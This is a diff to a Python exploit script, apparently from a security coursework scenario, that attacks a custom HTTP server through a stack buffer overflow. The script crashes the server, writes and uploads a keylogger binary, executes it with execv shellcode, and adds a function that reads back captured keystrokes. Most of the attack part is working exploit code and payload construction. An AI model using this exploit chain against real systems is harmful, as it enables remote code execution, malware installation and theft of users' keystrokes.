@@ -15,9 +15,30 @@ Next the goal is the same as in scenario 1, crash the server so N = 1 again and 
 but now we also need to sent the keylogger first and execute this keylogger which is now located on the stack in the space
 from previous alinea.
 
-To do this we don't put the keylogger inside the stack frame of log_message but just append it to the payload
-after the spot to place the return address to the shellcode and reference the start of the keylogger
-in that shell code. Now we just execute this binary which is now located on the stack.
+So next we want to sent the keylogger to the server and execute it.
+To do this we don't put the keylogger inside the stack frame of log_message but just append it after the payload.
+This way it doesn't get written to log_message but is still on the stack in the buffer of handle_client.
+Now we can get the start address of this buffer and thus also the start address of the keylogger.
+Next we want to write the keylogger data on the stack to a file and execute it.
+To do this we need to create a new file, write the keylogger data to this file and execute it.
+Some problems arise here, many issues due to the fact that the used addresses aren't 64 bits long.
+That is why we shifted the addresses to 64 bits to sent the payload, but in the shellcode we need to shift them back to their original length.
+
+The problem is that the keylogger is too big to write in one go to the file.
+Sometimes it only finds 90 bytes, sometimes more and in very rare cases the full keylogger.
+After printing $rbx in handle_client after recv@pl, to see the length of the total received data in the buffer, it also appears to be sort of random.
+Thus file is never fully stored and the rest is filled with null bytes, causing an error when ran.
+Howerever when using nc -l -p 8080, it prints the full file, thus the server receives it but doesn't put it in the buffer for some reason. 
+
+To solve this issue, we can first create the file and write on the server using the same method as in scenario 1.
+Next we can do a POST request to the server to sent the keylogger data and put it in the keylogger file.
+Finally we can again sent a scenario 1 alike exploit and run the keylogger using execv.
+
+[EXPLOIT SUMMARY]
+1) Send crash payload
+2) Send log_message exploit to create keylogger file
+3) Send keylogger data using POST request
+4) Send run keylogger exploit
 '''
 
 from keystone import *
@@ -30,6 +51,27 @@ original_rbp = 0x7ffff75cee20 # the rbp value before the 'ret' instruction execu
 keylogger_start_address = 0x7ffff75cf2d1
 log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
 log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer
+
+### FUNCTIONS ###
+def watch_keyboard_input():
+    # Create a connection to the server
+    print(f"Connecting to {host}:{port}")
+    conn = remote(host, port)
+    
+    try:
+        while True:
+            # Receive data from the server
+            data = conn.recv(1024)
+            if not data:
+                break
+            # Print the received key events
+            print(data.decode('utf-8'), end='')
+    except KeyboardInterrupt:
+        print("Client disconnected")
+    finally:
+        conn.close()
+    
+    print("Connection closed")
 
 ### PAYLOAD ###
 message_prefix = b"GET /data.txt HTTP/1.1\r\n"
@@ -45,7 +87,7 @@ crash += b"\r\n\r\n"
 
 ### CREATE THE ATTACK PAYLOAD ###
 # Load the keylogger binary file keylogger.exe
-with open("./scenario_3/keylogger", "rb") as file:
+with open("./scenario_3/keylogger_adv", "rb") as file:
   keylogger = file.read()
   
 # Get the keylogger
@@ -53,13 +95,6 @@ keylogger = bytes(keylogger)
 
 # Get keylogger length
 keylogger_len = len(keylogger)
-
-# PROBLEM
-# Sometimes only find 90 bytes, sometimes more and in very rare cases HALLORANDOM is found
-# Breakpoint at 0x4035a2 and print $rbx to see the length of the total received data in the buffer (random?!)
-# Thus file is never fully stored and the rest if filled with null bytes, causing an error
-# Howerever when using nc -l -p 8080 it prints the full file, thus the server receives it but doesn't put it in the buffer
-# keylogger = b"A" * (keylogger_len - 11) + b"HALLORANDOM" 
 
 added_keylogger_len_bits = 32 - keylogger_len.bit_length()
 added_keylogger_len_bits = added_keylogger_len_bits - (added_keylogger_len_bits % 4)
@@ -176,7 +211,8 @@ sleep(2)
 remote(host, port).send(post_keylogger) # send post payload
 sleep(2) 
 remote(host, port).send(run_keylogger) 
-
+sleep(2)
+watch_keyboard_input()
 
 # details for 'payload_rsp_offset':
 #
